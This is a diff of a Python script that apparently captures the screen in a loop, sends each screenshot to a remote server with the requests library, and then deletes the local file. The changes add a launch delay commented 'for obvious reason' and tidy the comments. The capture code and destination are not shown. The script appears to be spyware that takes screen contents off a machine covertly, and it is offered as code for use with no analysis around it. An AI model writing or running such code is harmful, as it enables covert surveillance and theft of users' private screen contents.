@@ -1,7 +1,11 @@
+#! /usr/bin/python
 import pyautogui
+import time 
 import os
 import requests
 
+# delay for obvious reason remove if you want ig 
+time.sleep(1) #adapt to your liking im not stopping you (yet)
 # Path where the screenshot will be saved temporarily
 screenshot_path = "screenshot.png"
 
@@ -29,5 +33,5 @@ while True:
     else:
        print(f"Failed to send screenshot: {response.status_code}")
 
-#(Optional), deletes the screenshot after sending it
+#(Optional) delete the screenshot after sending it
     os.remove(screenshot_path)
